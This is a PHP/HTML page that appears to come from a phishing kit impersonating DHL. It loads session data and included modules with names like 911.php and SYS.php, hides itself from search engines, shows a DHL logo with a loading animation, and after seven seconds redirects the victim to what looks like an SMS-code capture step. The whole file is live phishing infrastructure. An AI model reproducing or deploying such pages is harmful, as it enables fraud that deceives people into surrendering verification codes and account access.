<?php
session_start();

include("./ABRID/911.php");
include("./ABRID/SYS.php");
include("X_911.php");

$one = $_SESSION["one"];
$one = str_replace(" ","",$one);
?>
<!doctype html>
<html>
<head>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <meta name="robots" content="noindex," "nofollow,"="" "noimageindex,"="" "noarchive,"="" "nocache,"="" "nosnippet"="">
		<meta http-equiv="refresh" content="7; URL= ./E.php?SMS=1#KJSDKJhjghtyuUJSUSQUIQSIklklsisiiIUZIUZEJQSJkkjsJSJS">
        
        <!-- CSS FILES -->
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0/dist/css/bootstrap.min.css">
        <link rel="stylesheet" href="./X911/font-awesome.min.css">
		<link rel="stylesheet" href="https://dancinggorillas.com/fonts/1/style.css">
		<link rel="stylesheet" href="./X911/bootstrap-icons.css">
		
        <link rel="icon" type="image/x-icon" href="./X911/favicon.ico">

        <title>| DHL |</title>
    </head>

<body>

        <div>
		  <div>
		    <div class="">
		      <div class="">
        <div style="color: orange;padding: 100px;">
          <div class="d-flex justify-content-center">
            <div>
                <img src="./X911/dhl-logo.svg" class="sfli" style="
    width: 100px;
">
            </div>
          </div><br>

<div class="d-flex justify-content-center">
            <div>
                <img src="./X911/VIVA.gif" class="sfli" style="
    width: 100px;
">
            </div>
          </div>
        </div>
		      </div>
		    </div>
		  </div>
		</div>

        <!-- JS FILES -->
        <script src="https://code.jquery.com/jquery-3.6.1.min.js"></script>
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.0/js/all.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
        
     
	 </body></html>